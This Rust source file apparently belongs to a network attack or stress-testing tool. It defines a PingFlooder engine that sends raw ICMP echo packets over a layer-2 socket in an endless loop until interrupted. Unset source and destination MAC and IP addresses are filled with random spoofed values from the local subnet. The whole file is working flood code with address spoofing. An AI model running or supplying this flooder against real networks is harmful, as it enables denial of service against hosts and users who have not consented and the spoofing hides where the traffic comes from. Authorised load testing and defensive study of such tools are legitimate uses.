use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::net::Ipv4Addr;
use crate::engines::PingArgs;
use crate::builders::Packets;
use crate::generators::RandomValues;
use crate::iface::IfaceInfo;
use crate::sockets::Layer2Socket;
use crate::utils::{ inline_display, get_first_and_last_ip, CtrlCHandler, abort, TypeConverter };



pub struct PingFlooder {
    args      : PingArgs,
    rand      : RandomValues,
    builder   : Packets,
    iface     : String,
    pkts_sent : usize,
    pkt_data  : PacketData,
}


impl PingFlooder {

    pub fn new(args: PingArgs) -> Self {
        let iface               = IfaceInfo::iface_from_ip(args.dst_ip);
        let (first_ip, last_ip) = get_first_and_last_ip(&iface);

        Self {
            rand      : RandomValues::new(Some(first_ip), Some(last_ip)),
            builder   : Packets::new(),
            pkts_sent : 0,
            pkt_data  : Default::default(),
            iface,
            args,
        }
    }

    
    
    pub fn execute(&mut self){
        self.set_pkt_info_for();
        self.send_endlessly();
    }



    fn set_pkt_info_for(&mut self) {
        self.pkt_data.src_ip  = self.args.src_ip;
        self.pkt_data.src_mac = if self.args.src_mac.is_none() {
                None
            } else {
                self.resolve_mac(self.args.src_mac.clone())
            };

        self.pkt_data.dst_ip  = Some(self.args.dst_ip);
        self.pkt_data.dst_mac = self.resolve_mac(Some(self.args.dst_mac.clone()));
    }



    fn resolve_mac(&self, input_mac: Option<String>) -> Option<[u8; 6]> {
        if input_mac.is_none() {
            return None;
        }

        let mac = input_mac.unwrap();

        let mac_to_parse = if mac == "local" {
            IfaceInfo::mac(&self.iface)
        } else {
            mac
        };

        match TypeConverter::mac_str_to_vec_u8(&mac_to_parse) {
            Err(e)  => { abort(e) },
            Ok(mac) => { Some(mac) },    
        }
    }

    

    fn send_endlessly(&mut self) {
        let socket  = Layer2Socket::new(&self.iface);
        let running = Arc::new(AtomicBool::new(true));
        CtrlCHandler::setup(running.clone());

        while running.load(Ordering::SeqCst) {
            let pkt = self.get_packet();
            socket.send(pkt);
            
            self.pkts_sent += 1;
            inline_display(&format!("Packets sent: {}", &self.pkts_sent));
        }
        
        println!("\nFlood interrupted");
    }



    #[inline]
    fn get_packet(&mut self) -> &[u8] {
        self.builder.icmp_ping_ether(
            self.pkt_data.src_mac.unwrap_or_else(|| self.rand.random_mac()),
            self.pkt_data.src_ip.unwrap_or_else( || self.rand.random_ip()),
            self.pkt_data.dst_mac.unwrap_or_else(|| self.rand.random_mac()),
            self.pkt_data.dst_ip.unwrap_or_else( || self.rand.random_ip())
        )
    }

}



impl crate::EngineTrait for PingFlooder {
    type Args = PingArgs;
    
    fn new(args: Self::Args) -> Self {
        PingFlooder::new(args)
    }
    
    fn execute(&mut self) {
        self.execute();
    }
}



#[derive(Default)]
struct PacketData {
    src_ip  : Option<Ipv4Addr>,
    src_mac : Option<[u8; 6]>,
    dst_ip  : Option<Ipv4Addr>,
    dst_mac : Option<[u8; 6]>,
}